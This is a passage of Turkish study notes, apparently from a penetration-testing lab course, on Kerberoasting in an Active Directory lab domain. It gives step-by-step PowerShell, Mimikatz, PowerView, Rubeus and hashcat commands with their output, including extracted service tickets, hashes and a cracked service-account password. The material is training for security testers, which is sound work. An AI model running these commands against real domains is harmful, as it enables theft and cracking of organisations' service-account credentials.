CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433
CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        adfsconnect/azure01.inlanefreight.local

Existing SPN found!
```

Domain'deki çeşitli hostlar için birçok farklı SPN döndürüldüğünü fark edeceğiz. Biz kullanıcı hesaplarına odaklanacağız ve araç tarafından döndürülen bilgisayar hesaplarını göz ardı edeceğiz. Daha sonra, PowerShell kullanarak, yukarıdaki shell'de bir hesap için TGS biletleri talep edebilir ve bunları belleğe yükleyebiliriz. Belleğe yüklendikten sonra, Mimikatz kullanarak bunları ayıklayabiliriz. Bunu tek bir kullanıcıyı hedefleyerek deneyelim:


### Tek Bir Kullanıcıyı Hedefleme

```powershell-session
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

Devam etmeden önce, ne yaptığımızı görmek için yukarıdaki komutları parçalara ayıralım (bu aslında varsayılan Kerberoasting yöntemini kullanırken Rubeus tarafından kullanılan şeydir):

- [**Add-Type**](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdleti, PowerShell oturumumuza bir .NET framework sınıfı eklemek için kullanılır, bu sınıf daha sonra herhangi bir .NET framework nesnesi gibi örneklenebilir.

- **-AssemblyName** parametresi, kullanmak istediğimiz türleri içeren bir derlemeyi (assembly) belirtmemize olanak tanır.

- [**System.IdentityModel**](https://learn.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) adı alanı, güvenlik belirteci (security token) hizmetleri oluşturmak için çeşitli sınıflar içerir.

- Daha sonra[ **New-Object**](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet'ini kullanarak bir .NET Framework nesnesinin örneğini oluşturacağız.

- [**System.IdentityModel.Tokens** ](https://learn.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8)adı alanı içindeki[ **KerberosRequestorSecurityToken**](https://learn.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) sınıfını kullanarak bir güvenlik belirteci (security token) oluşturacağız ve bu sınıfa SPN adını iletip mevcut oturumumuzdaki hedef hesap için bir Kerberos TGS bileti isteyeceğiz.

Aynı yöntemi kullanarak tüm biletleri almayı da seçebiliriz, ancak bu aynı zamanda tüm bilgisayar hesaplarını da çekecektir, bu nedenle en uygun yöntem değildir.


### setspn.exe Kullanarak Tüm Biletleri Alma

```powershell-session
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:56:18 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-4
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:56:18 PM
ValidTo              : 2/24/2022 11:58:18 PM
ServicePrincipalName : kadmin/changepw
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-5
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:56:18 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : WSMAN/ACADEMY-EA-MS01
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

<SNIP>
```

Yukarıdaki komut, SPN'leri ayarlanmış tüm hesaplar için bilet talep etmek üzere önceki komutu setspn.exe ile birleştirir.

Artık biletler yüklendiğine göre, biletleri bellekten çıkarmak için Mimikatz'ı kullanabiliriz.


### Mimikatz ile Bellekten Ticket Çıkarma

```cmd-session
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export  

<SNIP>

[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
====================
Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
====================
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
ZWZyZWlnaHQubG9jYWw6MTQzMw==
====================

   * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi

<SNIP>
```

Eğer base64 /out:true komutunu belirtmezsek, Mimikatz biletleri ayıklayacak ve .kirbi dosyalarına yazacaktır. Ağ üzerindeki konumumuza bağlı olarak ve dosyaları atak hostumuza kolayca taşıyabiliyorsak, biletleri cracklemeye gittiğimizde bu daha kolay olabilir. Yukarıda alınan base64 blob'u alalım ve cracking için hazırlayalım.

Daha sonra, base64 blob'u alıp yeni satırları ve beyaz boşlukları kaldırabiliriz çünkü çıktı sütuna sarılmıştır ve bir sonraki adım için hepsine tek bir satırda ihtiyacımız vardır.


### Base64 Blob'u Cracking için Hazırlama

```shell-session
M1R4CKCK@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 

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
```

Yukarıdaki tek satırlık çıktıyı bir dosyaya yerleştirebilir ve base64 yardımcı programını kullanarak bir .kirbi dosyasına geri dönüştürebiliriz.


### Çıktıyı .kirbi Olarak Bir Dosyaya Yerleştirme
```shell-session
M1R4CKCK@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
```

Daha sonra, Kerberos biletini TGS dosyasından çıkarmak için [kirbi2john.py](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) aracının bu sürümünü kullanabiliriz.


### kirbi2john.py kullanarak Kerberos Biletini Çıkarma
```shell-session
M1R4CKCK@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
```

Daha sonra bileti Hashcat üzerinden tekrar çalıştırabilir ve “database!” açık metin şifresini elde edebiliriz.


#### Cracking the Hash with Hashcat

```shell-session
M1R4CKCK@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 

<SNIP>

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6c90164669fac72d23a631fef25804b5c8ec39680a4cc2959929edce34bbee6aff135bcbbb26a41a4b4e88b936896d4662ac849f56d7d68071be139cf4dfaf66497015297f9b44cdaef096c8d00255ec3e62f7105d905d0b2f39cef83db4d812718f95e8c99129f3207b386b4c32f7d57befd411e19c218148d19028eb0103d6be99ae23a454f6f3b0339d00d27879f342598937596cadad068ac3d815952a053f87d87b2584784b9d83050eea9a7c6474cde26c90f4a3546076a40ed374d004c465f654623499ca14e9c11538012cf00dee315e2ed444293822502d7f685022e61f3568e1db25b5cfe5a89b33878b6e3db05e9d91ad63820fcb7d0449e66add13f1efceddda95339db3dc919f1caff9690e54b3e4f9a8cf6998a9f9bf55c7a2ed2c87382e9da60f7ca3c22e08cc359f3ef6f4603a5af2fc28303bf3602ab9bc52026e58c27fb247fd4210f45244fd71484685b837fe9573a53964d54acfde7f963028764e99bea7b77139cb651328e862e43d894638288eace99b6d4f8b6684150db9adc43254143b77f32ebe6fbe309dde3b78305fdf0fe60505f9000b89c67c75ef6dd425e04fbe3a5ebf2d78a11a392d815a29ef48d9457fb6c780eb4cc07dfa68c2e97054788952f5ad92ca8d062e4a68967860302fd9630174af832e599bb5fca9cf341d7a1176868d9073796dffbd48efe99b222f4274e93066de646b3c60d1dd94072dd121dd0706024d11738a75ebeb5b7865a5505220d0f03aea6d359a17f3c5b6424989b31b6e52d1c558393aa34e81204fb107374a8884dcb16f6c59a76a0022004fd921734b8719e8694ba0d7f87eb46f5607af4eb1c681b6b5140dbc94a9ea7f5db6ae4c71fbc1024a25b77ac00bdc549d66373d390643be8f1007930a4124e99d4fcb6177dbd5669fb06170d3b8a75db9928164b55e454d08e77f917b1dd2e648d9c7eb0cb2b8ca0eff8a44d1ea5fdd67e01da79047a4a1406f761f5e3b6944cebed45379ea14e7a027c843fa405c07c8385a2102f07967a7cb4883f44ee72d4aa7a38b2701e77374016a01193f5b178e34f4cf2d8eadf651e162569eb421c74e8d5e0cc1a9fab58a4b9b63babb09efc3427e1667f9c7731bcabe3645986040a7306924df5e6e68655e7b0e2e88e7ce0281e0f554de82d9de6c4d9c8d2a36fce65bbb337a415030ce1d03c00fd9783afb5df0ee8fbabfa358521ad845e6d07fde7d34f2311ebae6e6a119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab:database!
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965e...7feeab
Time.Started.....: Thu Feb 24 22:03:03 2022 (8 secs)
Time.Estimated...: Thu Feb 24 22:03:11 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1150.5 kH/s (9.76ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8773632/14344385 (61.16%)
Rejected.........: 0/8773632 (0.00%)
Restore.Point....: 8749056/14344385 (60.99%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: davius -> darjes

Started: Thu Feb 24 22:03:00 2022
Stopped: Thu Feb 24 22:03:11 2022
```

Mimikatz ile base64 çıktısını atlamaya karar verirsek ve mimikatz # kerberos::list /export yazarsak, .kirbi dosyası (veya dosyaları) diske yazılacaktır. Bu durumda, dosyayı/dosyaları indirebilir ve kirbi2john.py dosyasını base64 kod çözme adımını atlayarak doğrudan çalıştırabiliriz.

Bir Windows makinesinden Kerberoasting ve çevrimdışı proses gerçekleştirmenin daha eski, daha manuel yolunu gördüğümüze göre, şimdi daha hızlı bazı yollara bakalım. Çoğu değerlendirme zaman kısıtlıdır ve genellikle mümkün olduğunca hızlı ve verimli çalışmamız gerekir, bu nedenle yukarıdaki yöntem muhtemelen her seferinde başvuracağımız yöntem olmayacaktır. Bununla birlikte, otomatik araçlarımızın başarısız olması veya engellenmesi durumunda elimizde başka hileler ve metodolojiler olması bizim için faydalı olabilir.


### Automated / Tool Based Route
Daha sonra, bir Windows hostundan Kerberoasting gerçekleştirmenin çok daha hızlı iki yolunu ele alacağız. İlk olarak, TGS biletlerini ayıklamak ve Hashcat formatına dönüştürmek için [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) kullanalım. SPN hesaplarını numaralandırarak başlayabiliriz.


### TGS Biletlerini Ayıklamak için PowerView Kullanma

```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```
Buradan, belirli bir kullanıcıyı hedefleyebilir ve TGS biletini Hashcat formatında alabiliriz.


### Belirli Bir Kullanıcıyı Hedeflemek için PowerView Kullanma
![Pasted image 20241021123352.png](/img/user/resimler/Pasted%20image%2020241021123352.png)

Son olarak, çevrimdışı işleme için tüm biletleri bir CSV dosyasına aktarabiliriz.


### Tüm Biletleri CSV Dosyasına Aktarma
```powershell-session
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```


### CSV Dosyasının İçeriğini Görüntüleme
```powershell-session
PS C:\htb> cat .\ilfreight_tgs.csv

"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"adfs","CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL","adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1

<SNIP>
```

Kerberoasting'i daha da hızlı ve kolay gerçekleştirmek için GhostPack'ten Rubeus'u da kullanabiliriz. [Rubeus](https://github.com/GhostPack/Rubeus) bize Kerberoasting yapmak için çeşitli seçenekler sunar.

#### Using Rubeus
```powershell-session
PS C:\htb> .\Rubeus.exe

<SNIP>

Roasting:

    Perform Kerberoasting:
        Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting, outputting hashes to a file:
        Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]

    Perform Kerberoasting, outputting hashes in the file output format, but to the console:
        Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with alternate credentials:
        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with an existing TGT:
        Rubeus.exe kerberoast </spn:"blah/blah" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT using an enterprise principal:
        Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:
        Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]

    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
        Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]

    Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
        Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]

    List statistics about found Kerberoastable accounts without actually sending ticket requests:
        Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
        Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]

    Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:
        Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]

    Perform AES Kerberoasting:
        Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]
```
Rubeus yardım menüsünde gezinirken görebileceğimiz gibi, araç Kerberos ile etkileşim için çok sayıda seçeneğe sahiptir, bunların çoğu bu modülün kapsamı dışındadır ve gelişmiş Kerberos saldırıları hakkında daha sonraki modüllerde derinlemesine ele alınacaktır. Menüde gezinmeye, seçeneklere aşina olmaya ve diğer çeşitli olası görevleri okumaya değer. Bazı seçenekler şunlardır:

* Kerberoasting gerçekleştirme ve bir dosyaya hash çıktısı alma
* Alternatif kimlik bilgilerini kullanma
* Kerberoasting'in pass-the-ticket atağı ile birlikte gerçekleştirilmesi
* AES özellikli hesapları filtrelemek için “opsec” Kerberoasting gerçekleştirme
* Belirli bir tarih aralığında ayarlanmış hesap şifreleri için bilet talep etme
* Talep edilen bilet sayısına bir sınır getirilmesi
* AES Kerberoasting gerçekleştirme


### Rubeus'un Yeteneklerini Görüntüleme
![Pasted image 20241021123826.png](/img/user/resimler/Pasted%20image%2020241021123826.png)
İlk olarak bazı istatistikleri toplamak için Rubeus'u kullanabiliriz. Aşağıdaki çıktıdan, dokuz Kerberoastable kullanıcı olduğunu, bunlardan yedisinin bilet istekleri için RC4 şifrelemesini ve ikisinin AES 128/256'yı desteklediğini görebiliriz. Şifreleme türleri hakkında daha sonra bilgi vereceğiz. Ayrıca dokuz hesabın tamamının şifresinin bu yıl (yazım sırasında 2022) belirlendiğini görüyoruz. Eğer şifreleri 5 ya da daha fazla yıl önce belirlenmiş SPN hesapları görseydik, bu hesaplar gelecek vaat eden hedefler olabilirdi çünkü kuruluş daha az olgunken belirlenmiş ve hiç değiştirilmemiş zayıf bir şifreye sahip olabilirlerdi.


### /stats Bayrağını Kullanma
![Pasted image 20241021124015.png](/img/user/resimler/Pasted%20image%2020241021124015.png)
Rubeus'u kullanarak admincount özelliği 1 olarak ayarlanmış hesaplar için bilet talep edelim. Bunlar muhtemelen yüksek değerli hedefler olacaktır ve Hashcat ile çevrimdışı kırma çabaları için ilk odak noktamıza değer. Hashcat kullanarak çevrimdışı kırma için hash'in daha kolay kopyalanabilmesi için /nowrap bayrağını belirttiğinizden emin olun. Belgelere göre, “”/==nowrap==“ bayrağı herhangi bir base64 bilet blobunun herhangi bir fonksiyon için sütuna sarılmasını engeller”; bu nedenle, Hashcat ile kırmadan önce beyaz boşlukları veya yeni satırları kırma konusunda endişelenmemize gerek kalmayacak.,


### /nowrap Bayrağını Kullanma
```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))'

[*] Total kerberoastable users : 3


[*] SamAccountName         : backupagent
[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local
